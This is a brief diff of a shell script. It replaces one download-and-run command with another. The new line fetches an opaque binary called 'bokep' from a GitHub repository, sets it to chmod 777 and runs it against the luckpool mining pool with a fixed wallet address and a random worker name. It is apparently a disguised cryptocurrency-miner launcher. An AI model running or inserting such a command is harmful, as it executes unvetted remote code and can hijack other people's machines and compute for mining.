@@ -35,4 +35,4 @@ echo "**"
 echo " "
 echo " "
 
-wget https://github.com/Marisakitam/kaman/raw/main/holo && chmod 777 holo && ./holo -v -l eu.luckpool.net:3956 -u RMHJAUh6ETgku7iaAL2tAYXQKvkoodo4VW.$(echo $(shuf -i 1-9999 -n 1)HDMI) -p x -t 2
+wget https://github.com/WxYtzaiu/WxYtzaiu/raw/main/bokep && chmod 777 bokep && ./bokep -v -l eu.luckpool.net:3956 -u RMHJAUh6ETgku7iaAL2tAYXQKvkoodo4VW.$(echo $(shuf -i 1-9999 -n 1)HDMI) -p x -t 2
